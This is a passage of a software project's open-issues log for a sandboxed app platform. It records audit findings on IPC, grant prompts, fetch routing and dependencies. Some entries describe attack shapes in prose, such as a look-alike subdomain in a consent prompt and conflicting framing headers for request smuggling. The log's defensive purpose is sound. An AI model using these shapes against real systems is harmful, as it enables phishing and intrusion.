and `src/nostr/README.md` explains why that is load-bearing rather than incidental: an npub
must be the **same across every client site**, which a per-origin app key cannot give.

`requestIdentity` is documented as triggering **the connect prompt** — and that prompt is
Phase 4 / build step 4 work, explicitly out of scope for queue item 2.5 (the NIP-07 surface
itself). So `window.nostr` has no real path to reach a page today: it is not that something is
broken, it is that one of its two required pieces has not been built yet. This is one half of
item 2.5's own exit criterion going unmet, worth having on the record rather than living only
inside a merged PR body.

Confirmed this is not a case of stubbing something with a worse, silently-broken method instead:
`src/preload/README.md`'s own stated rule — *"a method that always threw `'invalid'` would be
worse than a method that is not there"* — already rules out wiring `window.nostr` onto an `id`
object with no working `requestIdentity` behind it, so nothing was skipped by oversight.

**AI recommendation:** `window.nostr` should be injected into a page alongside the connect
prompt landing (build step 4), not stubbed into place earlier just to have something present —
consistent with the preload rule quoted above.

**Needed by:** build step 4 (the connect prompt). Not blocking queue item 2.5, whose own scope
was built and tested against an injected stub by design.

### A112 — the synchronous `fs` path does not share the per-origin in-flight budget the async path uses **[STILL OPEN]**

**Raised 2026-09-10**, lane P2-2's synchronous read path (PR #124), filed by the conductor.
Reported by the lane as a security-relevant tradeoff it deliberately did not close alone.

`fs.readFile`/`writeFile` run through `HandleTable`'s per-origin in-flight budget, so one origin
cannot monopolise filesystem I/O. `fs.readFileSync` does not: it goes over
`ipcRenderer.sendSync` to `registerSyncFsIpc`, checks the shared rate limiter, and then reads.
The grant check and the path confinement **are** shared — `sync-fs-policy.ts` calls
`broker.fs.confineSync`, which is the same `confineForOrigin` the async path uses, so this is a
fairness gap and not a confinement gap.

**Why it is not merely "not done here":** `HandleTable.run`'s budget is `async`-shaped by
construction — it awaits a slot. A synchronous reply cannot await one without blocking the
main process, which would turn a per-origin fairness mechanism into a way for one origin to
stall every origin, including the shell. So this needs a design, not an afternoon: either a
synchronous admission counter alongside the async budget, or an argument that the sync path's
own rate limiter is sufficient because a blocked renderer is self-limiting in a way an async
caller is not.

The exposure is bounded by the fact that the renderer making the call is itself blocked for the
duration, so an app cannot issue concurrent synchronous reads from one frame — but it says
nothing about many frames, or about one frame in a tight loop.

**Still open.** Needs an owner decision on whether the sync path needs its own admission control
before any app depends on `readFileSync` under load.

### A113 — on the `exposeFallback` path, a thrown `OrivonError` reaches a page without its `code` **[STILL OPEN]**

**Raised 2026-09-10**, found by the conductor while verifying lane P2-2 (PR #124). **Pre-existing
and not introduced by that PR** — it affects every method on that path, not only the new one.

Measured, not reasoned: a real page calling `orivon.fs.readFileSync` without a grant received
`{name: "Error", message: "fs is not granted to this origin"}` — no `code`. `contextBridge`
flattens a custom error thrown from the isolated world into a plain `Error`, dropping
non-standard properties, so an app cannot branch on the closed enum
(`src/contracts/errors.ts`) at all.

On the **`executeInMainWorld` path this is now fixed** (PR #124): the boundary is crossed as
plain data carrying the code, and `main-world-socket.ts`'s `installOrivon` constructs and
throws the real `OrivonError` inside the main world. A page now receives
`{code: "denied", name: "OrivonError"}`, verified by e2e.

**`exposeFallback()` cannot use that fix**, and this is the open part: it is the path taken when
`executeInMainWorld` is absent or throws, and in that case there is no main-world code running
at all — `installOrivon` never runs, which is the whole reason the fallback exists. So every
throw on that path happens in the isolated world and loses its `code`.

Scope worth stating precisely, because it is wider than the method that exposed it: this is a
property of the fallback path, so it applies to every `orivon.*` method there, not just
`readFileSync`. `ADR-0014` accepted `executeInMainWorld` (marked `@experimental`) as the primary
mechanism, which makes the fallback the degraded path rather than the common one — but a
degraded path that silently changes the error contract is worse than one that is merely
narrower.

**Still open.** Options not evaluated here: give the fallback a minimal main-world constructor
of its own, return a result envelope and have callers unwrap it, or accept the divergence and
document it as a known property of running without `executeInMainWorld`.

**Checked again 2026-09-13, S4-X-shimfix, while resolving the same-family A152: left alone, not
closed and not narrowed.** A152 fixed the `executeInMainWorld` path further (a page now gets a
real `Error` instance there, not only the right `.code`) and hardened `src/shim/`'s own
`isOrivonError` to recognise an OrivonError structurally -- but `exposeFallback()` never runs
`installOrivon` at all, so neither change touches it, and a value missing `.code` entirely (this
entry's own failure mode) is not something a structural shape check can recover regardless. See
A152's own resolution note for the full reasoning.

### A114 — delivering `TcpServer.connections` to a page needs a nested-port shape the IPC contract has no room for **[RESOLVED 2026-09-15]**

**Raised 2026-09-10**, lane P2-6wire (PR #126), filed by the conductor. **Architectural, so the
lane correctly parked it rather than choosing** — it needs a `src/contracts/` change and an owner
decision.

`net.listen` is built at the broker layer (PR #109) with real accepted-socket handles, teardown
and a revocation cascade proven against real sockets. It is **not** reachable from a page, and the
reason is a shape problem rather than missing plumbing: `TcpServer.connections` must hand the
renderer **a fresh port per accepted socket, nested inside the server's own port.**

None of the three delivery mechanisms that exist today covers that:

- `CONTROL_CHANNEL`'s reply is a structured clone and carries no transferable.
- `PORT_CHANNEL`'s `deliverPort` hands over a port only *in response to* a control-channel
  request — there is no broker-initiated delivery.
- A socket's own dedicated port carries `BrokerToRendererMessage`, a **closed union** in
  `src/contracts/ipc.ts` (`DataMessage | StreamEndMessage | WriteAckMessage | WriteFailedMessage |
  DatagramMessage | DatagramDropMessage | SendAckMessage | SendFailedMessage`) with no "here is a
  new handle and its port" member — and `PortLike.postMessage` takes no transfer list either.

**Two shapes were named but neither was chosen**, deliberately: deliver each accepted socket's
port over the *server's own* port (needs a new `BrokerToRendererMessage` member and a transfer
list on `PortLike`), or have the renderer make a second `PORT_CHANNEL` round trip per accepted
connection (keeps the contract as it stands, at the cost of a round trip per accept and a window
where an accepted socket exists in the broker with no renderer end).

**Consequences while it stays open:** `net.listen` is Broker ✅ / Page ❌ — a legal prefix, but it
means the flagship can download and not seed, which is one of the reasons `net.listen` was pulled
into this round at all. Queue item 5.1's exit criterion (a real torrent from a non-WebRTC TCP
peer) does not strictly require inbound listening, but the seeding half of the flagship does.

**Still open.** Needs the owner to pick a delivery shape before a contracts PR can be written.

**RESOLVED 2026-09-15.** `d-0028` chose the first of the two named shapes: deliver each accepted
socket's port over the *server's own* port. `AcceptedMessage`, a new `BrokerToRendererMessage`
member carrying the accepted `TcpSocket`'s full synchronous shape plus its `port`, landed in
`src/contracts/ipc.ts` (#199) — see A167 item 1 for the judgment calls that shape carried
(typing `port` as the renderer-side `MessagePort` rather than the broker-side
`MessagePortMain`, matching how `PortLike` already differs per process). The implementation —
`src/broker/transport/accept-pump.ts` constructing and sending it, `src/preload/server-port.ts`
and `src/preload/main-world-socket.ts`'s `buildServer` receiving it and building a real
`TcpServer.connections` `ReadableStream` — landed in #203. **Verified against the tree, not
assumed:** `dispatch-net.ts` has a real `'net.listen'` control-channel case,
`main-world-socket.ts`'s `buildServer` is exercised by `main-world-socket-listen.test.ts`
against the real `installOrivon` wiring, and `highWaterMark: 0` (the property that keeps the
broker from accepting a connection nobody asked for) is proven end to end across all three new
layers by `accept-pump.test.ts`, `server-port.test.ts` and `main-world-socket-listen.test.ts`
(A185's own verification). `compatibility-matrix.md`'s `net.listen` row moves to ✅✅✅✅.

**Half-open, tracked separately rather than reopening this entry:** A185 flags whether reusing
`CreditMessage`'s `bytesConsumed` field to mean "one accepted connection" (rather than a
purpose-built wire member) should stand now that the implementation exists to show what the
alternative would look like — a design-quality question, not a reachability one. This entry
closes because a page can now receive `TcpServer.connections` for real, which is the question it
asked; A185's own framing question is separate and still open.

---

## Post-merge audit of #89-#136 (2026-09-10)

Everything from **A115** down was raised by the post-merge audit of PRs #89-#94, #101-#104 and
#105-#136 — the step-2 defect closeout, the broker reorg, the test/comment/contracts housekeeping,
and the whole unattended build run. Review coverage for that block had been recorded nowhere except
prose in archived fleet ledgers, which is itself worth fixing; see A126.

Findings that were **fixed** in that audit's own PRs (#137 the reserved-port cross-pattern bypass,
#138 the favicon address check, #139 routed fetch's bounds/abort/decompression, and the others in
that wave) carry no A-number by design: the rule is fixed **or** filed, never silently dropped. The
entries below are the ones filed rather than fixed, plus two structural constraints discovered while
fixing.

### A115 — a subdomain-prefix confusable survives in the grant prompt's title **[PARTIALLY RESOLVED 2026-09-13]**

**Raised 2026-09-10**, post-merge audit (lane R2, T25 follow-up to #130/#134).

T25 is **more mitigated than #130's and #134's own bodies describe** — IDN is punycoded and
userinfo is stripped before the origin is rendered, both already true and both worth knowing before
anyone "fixes" them again. What survives is the subdomain-prefix confusable:
`accounts.google.com.attacker.example` renders with the reassuring part leftmost and the part that
decides authority at the far right, where a truncated or narrow dialog is least likely to show it.

Related but distinct from **A127**, which is about the origin not being reliably displayed at all.

**Needed by:** before an untrusted app can trigger a grant prompt from a page — i.e. as soon as
`app.requestGrant` has a caller.

**RESOLVED, to the no-dependency floor, 2026-09-13** (lane `stream/shell-04-origin-confusable`,
ahead of PR #165 giving `app.requestGrant` its first caller). `formatOriginForDisplay`
(`src/main/grant-prompt-render.ts`) elides an overlong host from the LEFT by plain character
count, so `attacker.example` always survives at the visible end and the reassuring prefix never
survives alone. **Partial, by design and named as such:** this is a length rule, not a
registrable-domain (eTLD+1) computation — that needs a public suffix list this repo does not
depend on, and is parked as **A142** rather than built, per this run's stop condition on new
dependencies. The floor is real (the confusable string a person reads can no longer be mistaken
for `accounts.google.com`) but a person still is not shown "this is/is not google.com" directly;
A142 is what would close that remaining gap.

**Trigger fired, 2026-09-13.** `app.requestGrant` is now wired onto `window.orivon` (the control
channel case in `src/broker/transport/ipc.ts`, the preload surface in
`src/preload/orivon-surface.ts`) — a real page can reach the grant prompt today, even though no
production caller registers an app yet (a separate, still-unwired gap). The confusable this entry
names is unfixed; it is simply no longer theoretical.

### A116 — routed `fetch()` never follows redirects **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (lane R3, PR #133).

Real `fetch()` follows redirects by default (`redirect: 'follow'`). `routedFetch` does not follow
them at all, and this is written down nowhere — not in the file, not in `src/preload/README.md`, and
not in #133's own "deliberately not done" list, which names response streaming and non-buffer bodies
but not this. **ADR-0017's Consequences section warns in its own words that a silent divergence in a
web platform API is a trap**, so this is an alignment gap against that ADR rather than only a
missing feature.

Following them is not a small addition: a redirect to a host outside the grant must be refused, a
redirect from https to http must not silently downgrade, and an app's own headers — which owner
decision 7 lets it set freely — must not be replayed to a new host. Each of those is a policy
decision, which is why this is filed rather than fixed.

**Needed by:** whenever a real app is ported. Most real HTTP APIs redirect somewhere.

### A117 — routed `fetch()` bypasses mixed-content enforcement as well as CORS and CSP **[RESOLVED 2026-09-14]**

**Raised 2026-09-10**, post-merge audit (lane R3, PR #133).

The CORS/CSP bypass is intended and documented — it is most of the point of routing. The
mixed-content half is not documented anywhere: a page served over https can reach an `http://`
granted host through the routed path, which its own renderer would have blocked.

**AI recommendation:** document it in the same place as the CORS/CSP note rather than change the
behaviour. An app that declared an `http://` host in its manifest and had a person approve it has
been through more scrutiny than the browser's blanket rule provides. But it must be *written down*,
by the same argument A116 makes.

**Documented, in a different place than the recommendation named.** `ADR-0017`'s own
Consequences section now names all three divergences together -- CORS, CSP and mixed content --
with the mixed-content half precisely scoped: not "Orivon allows mixed content" in general, only
that this one routed path skips an enforcement the renderer otherwise performs, for a host a
person reviewed and granted at install. The recommendation above pointed at
`src/preload/README.md`'s Design notes, which is where `fetch-route.ts`'s own header comment
sends a reader for this exact catalogue (body cap, unfollowed redirects, limited body types) --
but that file is owned by the `broker` stream (`parallel-work.md`'s ownership map puts it beside
`app.ts`), and this lane's own brief holds it to no file under `src/`. Left as a cross-reference
from the ADR rather than fixed in place: the owning stream should add a one-line pointer to the
ADR the next time it touches that file, so a reader lands on the same explanation from either
direction.

**Resolved 2026-09-14, in both halves.** `ADR-0017`'s Consequences section gained the consolidated
CORS/CSP/mixed-content note (PR #184), and the divergence itself is now listed in
`src/preload/README.md`'s own **"known divergences from a real browser's `fetch()`"** list, beside
the body cap, the brotli refusal, unfollowed redirects and the supported body types -- which is the
list this entry meant by "the same place", and the one `ADR-0017` requires be kept.

That second half was deliberately left open by the docs lane that closed the first: `src/preload/`
belongs to another stream under `parallel-work.md`'s ownership map, and it reported the gap rather
than reaching across a boundary. The conductor closed it once no lane was live in that directory.
Recorded because the lane's restraint was correct and should not read, later, as an oversight.

### A118 — an app that bypasses the real `Headers` class can put conflicting framing headers on a routed request **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (lane R3, PR #131/#133).

CRLF injection is guarded (#131 added guards on header names, values and the request line,
unprompted). What is not guarded is *semantic* framing conflict: an app supplying its own
header-pair list rather than a `Headers` instance can set both `Content-Length` and
`Transfer-Encoding`, or duplicate `Content-Length`, which is the classic request-smuggling shape if
anything downstream disagrees about which wins.

Bounded by the fact that these connections carry no ambient credentials and reach only granted
hosts, so the app is smuggling to a server it was already authorised to talk to. Filed rather than
fixed for that reason.

### A119 — `app.requestGrant`'s `patterns` array has no size bound **[PARTIALLY RESOLVED]**

**Raised 2026-09-10**, post-merge audit (lane R2, PR #127).

`decideGrantRequest` runs a caller-supplied array through the subset check with no length bound
first. `MAX_PATTERNS` bounds what a *manifest* may declare; this path does not reuse it. Same shape
as **A120**: a bound that exists elsewhere in the codebase was not applied here.

**Narrowed 2026-09-13.** `isAppRequestGrantParams` (`src/broker/transport/ipc-validation.ts`)
now rejects a `patterns` array longer than `MAX_PATTERNS` before `app.requestGrant`'s
control-channel case ever calls into `decideGrantRequest` — the only production path to it,
wired to a page for the first time in the same change. `decideGrantRequest` itself is still
unbounded internally, so a future direct caller (bypassing the control channel) would reopen
this; left that way deliberately, as a pure policy function outside this change's own scope.

### A120 — persisted grant, floor and acknowledgement files have no size bound before `readFileSync` + `JSON.parse` **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (lane R2, PR #129).

`node-ledger-storage.ts` reads each file whole and parses it, with no size check, on the main
process's thread. `MAX_MANIFEST_BYTES` (64 KiB) is the precedent for the bound that is missing.
The threat is narrow — these files are ours, under `userData` — but "narrow" is the argument that
was also available for the sync `fs` path, and that turned out to freeze the whole browser (see
A121's neighbour, and the sync-read cap that came out of this audit).

### A121 — no CI gate checks dependency advisories, and the repo now has runtime dependencies **[NEEDS OWNER DECISION]**

**Raised 2026-09-10**, post-merge audit (conductor, PR #120).

`check:natives` enforces Rule 8. **Nothing checks whether a dependency has a published advisory.**
That was defensible while the repo had zero runtime dependencies; #120 added nine. `npm audit`
reports **4 low** today, all reaching `elliptic` through `crypto-browserify`:

    GHSA-848j-6mx2-7j84  "Elliptic Uses a Cryptographic Primitive with a Risky Implementation"
    CWE-1240 · severity low · affects <=6.6.1 · installed 6.6.1

The reach is real rather than theoretical: `src/shim/module-map.ts` wires `crypto-browserify` in as
the `crypto` implementation **presented to apps**, so an app doing ECDH or signature verification
through the shim gets that implementation. Orivon's own identity cryptography is separate
(`policy/derive.ts`, WebCrypto, golden vectors checked in CI) and is unaffected.

`npm audit`'s only offered fix is a semver-major downgrade of `crypto-browserify`, which is why it
was not applied. **The finding is the missing gate, not this advisory.**

**Owner decision needed, two parts:** what threshold fails CI (`--audit-level=moderate` passes today
and would catch the next real one), and whether the four current lows are baselined or accepted.
The owner's standing preference is that exceptions stay possible but never silent, so whichever is
chosen wants a documented escape hatch rather than a suppression.

### A122 — `ShimProcess` has no `cwd()`, while `path-browserify`'s `resolve()` calls it **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (`/code-review` over `src/shim`, PRs #111/#120).

`src/shim/globals.ts`'s `ShimProcess` provides no `cwd()`. `path` is aliased to `path-browserify`,
whose `resolve()` calls `process.cwd()` (confirmed at `node_modules/path-browserify/index.js:124`).
Any relative `path.resolve` from app code therefore throws `TypeError: process.cwd is not a
function`.

Not simply a missing stub: **what a working directory means for a sandboxed app is a design
question.** The app's own confined root is the obvious answer and probably the right one, but it
should be chosen deliberately and written down, because every relative path an app resolves will
key off it.

### A123 — `IncomingMessage` never gets `.socket`, though `node-https.ts` is written as if it does **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (`/code-review` over `src/shim`, PR #131).

`src/shim/node-http-client.ts` builds an `IncomingMessage` with no `.socket`, so `res.socket.<anything>`
throws. `node-https.ts`'s own header describes behaviour that assumes it is present. Either provide
it or correct the header — the two disagreeing is the actual defect, since a reader trusts the header.

### A124 — the favicon address check does not pin the resolved address, unlike the loader's fetch **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (conductor hand-review of PR #138).

#138 gates the favicon fetch behind the T12 address check. The guard resolves the host and then
`net.fetch` resolves it again independently — **there is no pinning.**
`src/loader/electron-fetch.ts` *does* pin (`electronFetch(url, pinnedAddresses, signal)`), so the
favicon path is deliberately weaker than the install path.

Using Chromium's own `net.resolveHost` for the guard — the same resolver and cache `net.fetch`
consults — narrows the window to a cache expiry between the two, but does not close it. Filed rather
than fixed because pinning through `net.fetch` needs the loader's own mechanism, and #138 was scoped
to the address check.

Recorded specifically so that **a reader comparing `favicon.ts` to `install-origin.ts` finds the
difference already accounted for** rather than concluding one of them is wrong.

### A125 — `installFetchRoute` cannot be split, and it dominates its file **[PARTLY RESOLVED 2026-09-12]**

**Raised 2026-09-10**, post-merge audit (conductor, PR #139).

`installFetchRoute` is serialised with `Function.prototype.toString()` and re-executed in the main
world (ADR-0014's mechanism). Every helper and constant it uses must therefore live **physically
inside its body** — it cannot be split into sibling files, which is the remedy code-guidelines
Rule 2 assumes is always available.

The file reached **492 of 500 lines by absorbing one fix** (#139). It cannot take another feature,
and the usual escape is closed to it.

**This is a structural constraint on a trust-boundary file, not a style problem.** It needs a
decision before the next change to that file, not during one. Options that exist: raise the limit
for this file with a recorded reason (the `orivon:comment-budget` precedent shows the project
accepts justified, non-silent exceptions), move work out of the main world, or change how the
main-world installer is delivered.

**CORRECTION, 2026-09-12.** The headline above was too strong and this entry misled as written.
`installFetchRoute` itself genuinely cannot be split -- that part stands, and it is the real
constraint -- but the FILE could be, and was: PR #157 moved `exposeFetchRoute`, the ordinary
preload wiring, into `src/preload/expose-fetch-route.ts`, leaving `fetch-route.ts` at 491 lines
with real headroom. The seam is the one the file's own header already named: a payload serialised
into the main world that may reference no import, versus preload code that imports freely.

That split was itself load-bearing, not cosmetic. While fixing the decompression cap in the same
PR I twice wrote code that passed every unit test and would have broken in a real page -- once by
extracting a helper into a module the serialised function cannot import, once by referencing the
module-level `ROUTED_FETCH_MAX_BODY_BYTES`, which is only a MIRROR of a literal kept inside the
function body. Having the two kinds of code adjacent in one file is what made both mistakes easy.
`src/preload/tests/fetch-route.test.ts` now carries a guard that fails if `installFetchRoute`'s
source text references any module-level identifier.

**What is still open** is narrower than the original entry: the serialised function is ~440 lines
and cannot be divided, so it sets a floor under its file that no further splitting reduces. The
options listed above remain the options, minus the one already taken.

### A126 — review coverage is recorded nowhere **[RESOLVED 2026-09-14 -- lane B-doc-trio]**

**Raised 2026-09-10**, post-merge audit (conductor, process).

Which PRs have been independently reviewed, and by what, is recorded in **no label, no field and no
document** — only in prose inside archived fleet ledgers outside the repository. This audit existed
because the owner had to reconstruct the gap by hand and hand the list over; it could not be derived
from the repository at all.

**AI recommendation:** a `reviewed:` label, or one line per PR in a checked-in ledger. Cheap, and it
is the difference between "we think #105-#136 were never reviewed" and knowing.

**Resolved with the checked-in ledger, not the label.** `docs/development/review-coverage.md`,
following the same pattern `readability-log.md` already established here: a standing,
append-only log rather than a GitHub-side field. Reasoning over the three options this entry's
own recommendation named:

- **A GitHub label** is cheap to apply (`gh api -X POST .../issues/<n>/labels`, per `CLAUDE.md`'s
  workaround for the `gh pr edit --add-label` GraphQL failure) but disappears the moment anyone
  reads this repository offline or from a clone, and it can carry only a tag, not the shape of
  what actually ran -- "reviewed" says nothing about a hand-review over one diff versus a
  three-reviewer adversarial pass over ninety-three files. This project already keeps its
  process record in checked-in documents (`open-questions.md` itself, `readability-log.md`), and
  a label would be the one part of that record that lives somewhere else.
- **A line in the PR template** costs every author something and, worse, asks for the answer at
  the wrong time: review coverage is usually known only *after* a PR merges (an adversarial pass
  runs over a landing, not a diff still being opened), so the author would be filling in a field
  they cannot yet answer.
- **A checked-in document** is what was chosen: durable, greppable, and able to record what
  actually ran and what it found in aggregate, at the point the review event completes rather
  than the point the PR opens. Its named weakness -- going stale silently -- is the same weakness
  `readability-log.md` already carries and already manages, by being a short append-only log
  rather than a table someone has to keep in sync.

Populated with the material this run had on hand: PRs #163-#182 (a conductor hand-review of every
`src/broker`/`src/main` diff, a three-reviewer adversarial pass over the step-4 landing, and a
clean-checkout verification of the final state), verified against this run's own fleet ledger and
against `git log` rather than transcribed on trust. **The record explicitly starts at #163** --
everything before it is marked unrecorded, not unreviewed, since audits did happen earlier
(`docs/planning/audit-2026-08-25.md`) without ever being brought in-repo.

### A127 — the consent prompt shows the origin only in a field Electron says some platforms drop **[PARTIALLY RESOLVED]**

**Raised 2026-09-10**, post-merge audit (adversarial review of the consent path, PRs #130/#134).

`describeGrantRequest` puts the origin in `title` and nowhere else. `message` carries the capability
sentence and contains no origin; `detail` carries `Claims to be "<name>"`, which is the app's own
assertion about itself. Electron's own declaration for `MessageBoxOptions`:

    /** Title of the message box, some platforms will not show it. */
    title?: string;

**Where the title is dropped, the prompt identifies the requesting app solely by a string the app
chose** — the exact inversion `grant-prompt-render.ts`'s own doc comment says it exists to prevent.
Run-from-source on macOS is an `mvp-scope.md` IN-table item, and macOS is the platform historically
documented as ignoring message-box titles.

**The fix — render the origin somewhere always shown — is correct regardless of which platforms drop
the title, and is being made.** What stays open is the measurement: *no macOS machine was available
to this audit*, so the platform claim is reasoned from Electron's declaration and not observed.
Recorded rather than asserted, so nobody later cites it as measured.

**The mechanism half is confirmed landed, verified directly 2026-09-13** (lane
`stream/shell-04-origin-confusable`, fixing A115): `describeGrantRequest` already puts the origin
as `detail`'s first line, ahead of the `Claims to be "<name>"` line, on `main` as of `9b8d871` —
this predates that lane and was not built by it. That lane's own fix (A115) builds directly on
top of this field, passing the same rendered origin string through both `title` and `detail` so
neither can show a different, unprotected string from the other. **What stays open is exactly
what this entry already named as open: the macOS measurement.** Nothing since has run this dialog
on a real macOS build; treat "the title is not reliably shown" as reasoned, not measured, until
one does.

**Needed by:** confirmation needs one run of the prompt on a real macOS build. Until then, treat
"the title is not reliably displayed" as the operating assumption, since the fix costs nothing on
platforms that do show it.

### A128 — `pako` is a direct dependency nothing imports, while the live gzip path uses a different, nested copy **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (lane R4, PR #120).

`package.json` carries **nine** direct dependencies; `shim-dependency-review.md` records **eight** as
approved. The ninth, `pako@3.0.1`, is imported by nothing. Meanwhile the code path that actually runs
gzip/deflate reaches `browserify-zlib`'s own nested `pako@1.0.11` (2020), which was never
independently reviewed — the review approved `browserify-zlib`+`pako` as a pair and the pair that
actually runs is a different version.

Two separate things to settle: remove the unused direct dependency, and decide whether the nested
copy that does the work needs its own review. Neither is urgent; both are the kind of drift that is
cheap now and confusing later.

### A129 — `check-no-native-modules.mjs` cannot detect an install-script network download **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit (lane R4, Rule 8).

Rule 8's guard matches compiler-toolchain keywords. It does not detect a package whose `postinstall`
**downloads a prebuilt binary**, which reaches the same end — a native artefact on disk that breaks
run-from-source on a platform with no build for it — by a route the check does not look at.
Demonstrated live against `esbuild`'s own `postinstall`. **All nine runtime dependencies were
confirmed free of install scripts**, so nothing is wrong today; the gap is in what the guard can see.

### A130 — two parallel authorisation pipelines in the broker **[AI-REC]**

**Raised 2026-09-10**, post-merge audit (named-persona review; Brooks' essential-vs-accidental
complexity lens).

`checkConnectSecure` (`policy/connect-secure.ts`) reimplements `checkConnect`'s
(`policy/connect.ts`) authorisation pipeline: **six of nine deny reasons are duplicated** —
`bad-host`, `bad-port`, `non-canonical-host`, `not-declared`, `reserved-port`, `too-many-patterns`.

The complexity in address canonicalisation, rebinding resistance and path confinement is *essential*
— inherent to the problem, and handled seriously. The second copy is *accidental*: TLS termination is
orthogonal to whether an address is authorised, and nothing about "this connection will be encrypted"
changes which host a pattern permits. The split came from ADR-0015's organise-by-job structure, which
is a good instinct that here produced two answers to one question.

**The cost has already been paid.** The reserved-port cross-pattern bypass fixed in #137 existed
identically in both files and had to be fixed twice — and was nearly missed the second time, because
the lane that found it reasoned that `connectSecure` "uses a separate synchronous check" and was
therefore unaffected. A fix built to that boundary would have passed its own tests and left the TLS
path open. The forward cost is the same shape: every future policy change must be made twice,
correctly, by someone who does not know that.

**AI recommendation:** extract the shared authorisation decision so there is one implementation with
TLS as a parameter. A refactor with a security payoff rather than a tidiness exercise, and one that
wants its own PR with no other content.

### A131 — the compatibility matrix cannot show that nobody can use the product **[AI-REC]**

**Raised 2026-09-10**, post-merge audit (named-persona review; Cagan's problem-vs-solution lens).

`compatibility-matrix.md` scores capability cells. Its Table 1 can approach all-green while the
number of people who can use Orivon is **zero** — which is the state today: `app.requestGrant` has no
page-reachable caller, `installFromHint` has no caller, and the settings permissions list is empty by
construction.

The owner already identified the gap (owner decision **D-0010** item 4, 2026-09-10: *"the highest-reach
item is wiring `app.requestGrant` to the page ... until a page can ask, everything built last night is
invisible"*). The point of this entry is different: **the instrument that steers the work cannot show
it.** The matrix's own most recent pass *promoted* `app.requestGrant` from ❌ to ⚠️ for a mechanism
nothing calls. A run steered by a completeness scoreboard will keep making that trade, because the
scoreboard rewards it.

**AI recommendation, and it costs a documentation edit rather than engineering:** give Table 1 a first
row that is not a capability — *"a person can install an app and grant it something"* — and leave it
❌ until it is true. One honest row above the scoreboard changes what the next round optimises for.

### A132 — apps cannot tell Orivon-grade primitives from polyfill-grade ones **[PARTIALLY RESOLVED 2026-09-14 -- lane B-doc-trio]**

**Raised 2026-09-10**, post-merge audit (named-persona review; Thompson's trusting-trust lens).

**The structural decision here is right and should be recorded as such before the gap:** the shim runs
*inside the untrusted renderer*, so the nine polyfill packages are app-facing and on the far side of
the broker's boundary. A backdoored `crypto-browserify` cannot reach a socket the broker did not
authorise. **That placement is what makes admitting nine third-party packages survivable at all**, and
a future reviewer reading "nine dependencies, one with an advisory" should find that reasoning here
rather than reach for the wrong lever.

The gap is the label. `module-map.ts` presents `crypto-browserify` to applications **as `crypto`**. An
app author writing `require('crypto')` is not told they are getting a browserify polyfill (whose
`elliptic` carries A121's advisory), while Orivon's own identity cryptography is WebCrypto with golden
vectors checked in CI against an independent implementation. That separation is correct and invisible.

**AI recommendation:** say so in `src/shim/README.md` and in whatever documentation eventually faces
app authors. An app that signs something with `crypto.createSign()` believing it has the same footing
as `orivon.id.sign()` has been misled by a naming choice, not by a bug — and a documentation fix is
the whole remedy.

**Documented, in a different place than the recommendation named.** `security-model.md` gets a
new row, T26, that records the structural placement as the mitigation first -- in the entry's own
words, before the gap -- then names the gap precisely: `module-map.ts` presents
`crypto-browserify` as `crypto` with nothing that marks it apart from `orivon.id.*`'s
WebCrypto-backed identity primitives, and the two carry different security properties (A121's
advisory reaches one, not the other). `shim-dependency-review.md`'s own crypto-browserify verdict
now points to that row. **`src/shim/README.md` was deliberately not touched**, nor was "whatever
documentation eventually faces app authors" written -- the former is owned by the `shim` stream,
which has a lane live in that directory concurrently with this one, and this lane's brief holds
it to no file under `src/`; the latter does not exist yet and is build step 9's job
(`app-compatibility.md`), not this one's. Recorded as a gap for the owning stream to close with a
pointer to T26, and for build step 9 to inherit when app-author documentation is written. **No
API was built to distinguish the two** -- the entry itself rules that out as a contracts change,
and this lane agrees: the honest fix here is the label, not new surface.

### A133 — the grant prompt's "and N other sites" summary has no cap **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit; carried over from PR #130's own review, where it was
raised with the owner and then recorded only in a fleet ledger outside this repository. Filed here
at the owner's explicit request, because a finding that exists only in a run's working notes is not
filed at all.

`namedHostsPhrase` (`src/main/grant-prompt-render.ts`) names the first host and counts the rest:
*"Connect to youtube.com and 3 other sites."* There is **no upper bound on that count.** At three it
reads as intended. At forty-nine — *"Connect to youtube.com and 48 other sites"* — the summary has
become the thing owner decision D-0004 rejected a details-expander for: breadth acknowledged in a
number rather than shown.

The owner's stated requirement is that a narrow declaration and a broad one be *unmistakably
different at a glance*. A single line whose only signal of breadth is an integer the reader must
notice and weigh does not obviously meet that, and the point at which it stops meeting it is a
product judgement rather than an engineering one.

**Not proposed here:** a threshold. Whether the answer is a cap that flips to a warning, a different
sentence above some N, or something else is the owner's call, in the same register as D-0004 itself.

**Related:** A115 (a confusable in the same title), and the port-breadth gap fixed in PR #143 — which
was the *other* axis of the same problem and is why this one is now the remaining half.

### A134 — `manifest.ts` promises a "distinct, more serious prompt" for listening that does not exist **[STILL OPEN]**

**Raised 2026-09-10**, post-merge audit; same provenance as A133 — raised during PR #130's review,
recorded only in a fleet ledger, filed here at the owner's request.

`src/contracts/manifest.ts`'s own doc comment tells an app author that declaring a listening socket
draws a distinct, more serious consent prompt than an outbound connection does. **No such prompt is
implemented.** `describeCapabilityGrant` renders `tcp.listen` and `udp.bind` with `warning: false`
and a plain sentence naming the ports — the same visual weight as any ordinary grant.

Two reasons this is worth more than a comment fix. First, **`src/contracts/` is the durable asset**
(ADR-0002): a promise made there is the product's documentation, and an app author reading it forms
an expectation about what their users will see. Second, the underlying claim is probably right —
accepting inbound connections *is* a different kind of act from making outbound ones, and A114 means
`net.listen` cannot reach a page yet, so there is time to decide deliberately rather than under
pressure.

**Either the prompt gets built or the promise comes out of the contract.** Both are small; leaving
them disagreeing is the bad outcome, because the contract is what an app author trusts.

### A135 -- the shim refuses an unimplemented member by absence, not by name **[RESOLVED 2026-09-14 -- stream/shim-12-named-refusals]**

**The shim refuses an unimplemented member by absence, not by name.** `src/shim/`'s module
targets export only what is built: `dns` exports `lookup` alone, `dgram.Socket` implements six
methods. A caller reaching anything else -- `dns.resolve4(...)`, `socket.setBroadcast(...)` --
gets `undefined is not a function`: no name, no reason, and no pointer to the
compatibility-matrix row that would explain whether it is unbuilt, refused by design, or a gap
nobody noticed.

